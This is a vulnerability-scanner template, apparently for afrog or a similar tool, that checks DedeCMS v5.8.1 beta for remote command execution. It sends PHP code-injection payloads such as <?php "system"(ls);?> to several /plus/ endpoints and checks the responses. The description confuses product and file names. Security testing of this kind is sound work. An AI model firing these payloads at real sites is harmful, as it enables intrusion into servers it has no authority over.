id: dedecms-common-func-rce

info:
  name: DedeCMS common.func.php 远程命令执行漏洞
  author: daffainfo
  severity: critical
  description: |-
    DocCMS flink.php 文件存远程命令执行漏洞，攻击者通过漏洞可以执行任意命令。漏洞影响：DedeCMS v5.81 beta 内测版
    fofa: "DedeCMS_V5.8.1"
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/DedeCMS%20common.func.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  tags: dedecms,rce,sqli
  created: 2023/08/13

rules:
  r0:
    brute:
      mode: pitchfork
      commit: winner
      continue: false
      p:
        - /plus/flink.php?dopost=save
        - /plus/users_products.php?oid=1337
        - /plus/download.php?aid=1337
        - /plus/showphoto.php?aid=1337
        - /plus/users-do.php?fmdo=sendMail
        - /plus/posttocar.php?id=1337
        - /plus/vote.php?dopost=view
        - /plus/carbuyaction.php?do=clickout
        - /plus/recommend.php?c=dir
      ref:
        - <?php "system"(ls);?>
        - <?php "system"(ls);?>
        - <?php "system"(ls);?>
        - <?php "system"(ls);?>
        - <?php "system"(ls);?>
        - <?php "system"(ls);?>
        - <?php "system"(ls);?>
        - <?php "system"(ls);?>
        - <?php "system"($c);/*
    request:
      method: GET
      path: "{{p}}"
    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
expression: r0()
